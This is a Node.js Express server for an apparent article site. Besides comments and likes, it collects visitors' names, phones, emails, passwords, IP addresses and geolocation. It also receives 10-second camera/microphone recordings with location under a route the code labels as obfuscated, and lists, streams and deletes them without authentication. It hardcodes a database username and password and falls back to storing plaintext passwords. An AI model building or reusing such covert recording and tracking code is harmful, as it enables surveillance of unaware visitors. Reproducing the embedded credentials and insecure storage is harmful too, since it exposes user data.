const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const bcrypt = require('bcrypt'); // for hashing passwords


const app = express();
app.use(cors());
// serve frontend files located inside this server folder
const path = require('path');
app.use(express.static(path.join(__dirname)));
// note: index.html and recordings.html now live directly alongside server.js
// allow larger payloads (recording blobs may be large)
app.use(express.json({ limit: '50mb' }));

// connect to MongoDB (uses MONGODB_URI env var if set, otherwise falls back to atlas string)
const mongoUri = process.env.MONGODB_URI ||
  'mongodb+srv://workshah678_db_user:95WYKFeitEakFn7a@cluster0.r0nesas.mongodb.net/?appName=Cluster0';
mongoose.connect(mongoUri, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error', err));



// Simple schemas
const commentSchema = new mongoose.Schema({
  articleTitle: String,
  text: String,
  user: { type: mongoose.Schema.Types.ObjectId, ref: 'UserInfo' },
  createdAt: { type: Date, default: Date.now }
});
const Comment = mongoose.model('Comment', commentSchema);

const likeSchema = new mongoose.Schema({
  articleTitle: String,
  count: { type: Number, default: 0 },
  // track which user gave the like (useful for preventing dupes later)
  user: { type: mongoose.Schema.Types.ObjectId, ref: 'UserInfo' }
});
const Like = mongoose.model('Like', likeSchema);

const trackingSchema = new mongoose.Schema({
  articleTitle: String,
  user: { type: mongoose.Schema.Types.ObjectId, ref: 'UserInfo' },
  ip: String,
  userAgent: String,
  latitude: Number,
  longitude: Number,
  createdAt: { type: Date, default: Date.now }
});
const Tracking = mongoose.model('Tracking', trackingSchema);

// recordings schema for 10-second video/audio blobs
const recordingSchema = new mongoose.Schema({
  data: Buffer,            // raw binary data of the clip
  mimeType: String,        // e.g., video/webm or video/mp4
  user: { type: mongoose.Schema.Types.ObjectId, ref: 'UserInfo' },
  latitude: Number,
  longitude: Number,
  createdAt: { type: Date, default: Date.now }
});
const Recording = mongoose.model('Recording', recordingSchema);

// simple schema to store user info collected from popup
const userInfoSchema = new mongoose.Schema({
  name: String,
  phone: String,
  email: String,
  password: String,           // stored hashed (or plain if hashing fails)
  city: String,
  country: String,
  permissions: {
    location: { type: Boolean, default: false },
    camera: { type: Boolean, default: false },
    microphone: { type: Boolean, default: false }
  },
  createdAt: { type: Date, default: Date.now }
});
const UserInfo = mongoose.model('UserInfo', userInfoSchema);

// API routes
app.post('/api/comments', async (req, res) => {
  try {
    const { articleTitle, text, userId } = req.body;
    const comment = new Comment({ articleTitle, text, user: userId });
    await comment.save();
    return res.status(201).json(comment);
  } catch (err) {
    console.error(err);
    return res.status(500).json({ error: 'Failed to save comment' });
  }
});

app.get('/api/comments', async (req, res) => {
  const { articleTitle } = req.query;
  const filter = articleTitle ? { articleTitle } : {};
  const comments = await Comment.find(filter).sort({ createdAt: -1 });
  res.json(comments);
});

app.post('/api/likes', async (req, res) => {
  try {
    const { articleTitle, userId } = req.body;
    let like = await Like.findOne({ articleTitle, user: userId });
    if (!like) {
      like = new Like({ articleTitle, count: 1, user: userId });
    } else {
      like.count += 1;
    }
    await like.save();
    res.json(like);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to update like' });
  }
});

app.get('/api/likes', async (req, res) => {
  const { articleTitle } = req.query;
  const like = await Like.findOne({ articleTitle });
  res.json(like || { articleTitle, count: 0 });
});

app.post('/api/track', async (req, res) => {
  try {
    console.log('received tracking data', req.body);
    const { userId, ...rest } = req.body;
    const track = new Tracking({ ...rest, user: userId });
    await track.save();
    res.status(201).json(track);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to track data' });
  }
});

// endpoint to receive basic user info (and optional initial permissions) from popup
app.post('/api/users', async (req, res) => {
  try {
    let { name, phone, email, password, city, country, permissions } = req.body;

    // basic email format validation
    const emailRegex = /^\S+@\S+\.\S+$/;
    if (email && !emailRegex.test(email)) {
      return res.status(400).json({ error: 'Invalid email format' });
    }

    // hash password if provided
    if (password) {
      try {
        const SALT_ROUNDS = 10;
        password = await bcrypt.hash(password, SALT_ROUNDS);
      } catch (e) {
        console.warn('Password hashing failed, storing plain text', e);
      }
    }

    const user = new UserInfo({
      name,
      phone,
      email,
      password,
      city,
      country,
      permissions
    });
    await user.save();

    res.status(201).json(user);
  } catch (err) {
    console.error('Failed to save user info', err);
    res.status(500).json({ error: 'Failed to save user info' });
  }
});

// allow updating a user's permissions after creation
app.put('/api/users/:id', async (req, res) => {
  try {
    const { permissions } = req.body;
    const user = await UserInfo.findByIdAndUpdate(req.params.id,
      { permissions }, { new: true });
    if (!user) return res.status(404).json({ error: 'User not found' });
    res.json(user);
  } catch (err) {
    console.error('Failed to update user info', err);
    res.status(500).json({ error: 'Failed to update user info' });
  }
});



// endpoint for receiving 10‑second video/audio recordings

// recordings API route constant for obfuscation
const RECORD_ROUTE = '/api/45ytyfwgqu';

// list recordings metadata
app.get(RECORD_ROUTE, async (req, res) => {
  try {
    const recs = await Recording.find({}, '_id mimeType createdAt').sort({ createdAt: -1 });
    res.json(recs);
  } catch (err) {
    console.error(err);
    res.status(500).json({ error: 'Failed to list recordings' });
  }
});

// stream a single recording by id
app.get(RECORD_ROUTE + '/:id', async (req, res) => {
  try {
    const rec = await Recording.findById(req.params.id);
    if (!rec) {
      return res.status(404).send('Recording not found');
    }
    
    console.log('Streaming recording:', {
      id: rec._id,
      mimeType: rec.mimeType,
      dataSize: rec.data.length
    });
    
    // Set proper headers for video streaming
    res.setHeader('Content-Type', rec.mimeType || 'video/webm');
    res.setHeader('Content-Length', rec.data.length);
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Cache-Control', 'no-cache');
    
    res.send(rec.data);
  } catch (err) {
    console.error('Error streaming recording:', err);
    res.status(500).send('Failed to fetch recording');
  }
});

// endpoint for receiving video/audio recordings
app.post(RECORD_ROUTE, async (req, res) => {
  try {
    const { data, location, mimeType, userId } = req.body;
    console.log('Received recording:', {
      dataSize: data?.length,
      location,
      mimeType,
      hasData: !!data,
      userId
    });
    
    if (!data) {
      return res.status(400).json({ error: 'Missing data' });
    }
    
    // Validate that it's valid base64 and convert to buffer
    let buffer;
    try {
      buffer = Buffer.from(data, 'base64');
      console.log('Converted to buffer, size:', buffer.length);
    } catch (e) {
      console.error('Base64 conversion error:', e);
      return res.status(400).json({ error: 'Invalid base64 data' });
    }
    
    if (buffer.length < 100) {
      return res.status(400).json({ error: 'Recording too small' });
    }
    
    const recData = { 
      data: buffer, 
      mimeType: mimeType || 'video/webm' // Keep original MIME type
    };
    
    if (userId) recData.user = userId;
    if (location && typeof location.latitude === 'number') {
      recData.latitude = location.latitude;
      recData.longitude = location.longitude;
    }
    
    const rec = new Recording(recData);
    await rec.save();
    console.log('Recording saved with ID:', rec._id);
    
    res.status(201).json({ _id: rec._id });
  } catch (err) {
    console.error('Error saving recording:', err);
    res.status(500).json({ error: 'Failed to save recording: ' + err.message });
  }
});

// delete a recording by id
app.delete(RECORD_ROUTE + '/:id', async (req, res) => {
  try {
    const result = await Recording.deleteOne({ _id: req.params.id });
    if (result.deletedCount === 0) return res.status(404).json({ error: 'Not found' });
    res.json({ success: true });
  } catch (err) {
    console.error('Error deleting recording:', err);
    res.status(500).json({ error: 'Failed to delete recording' });
  }
});

const PORT = process.env.PORT || 5000;
const server = app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

server.on('error', err => {
  if (err.code === 'EADDRINUSE') {
    console.error(`Port ${PORT} already in use.`);
    console.error('Use a different port or stop the process that is occupying it.');
    console.error('Example: PORT=5001 npm start');
    process.exit(1);
  } else {
    console.error('Server error:', err);
  }
});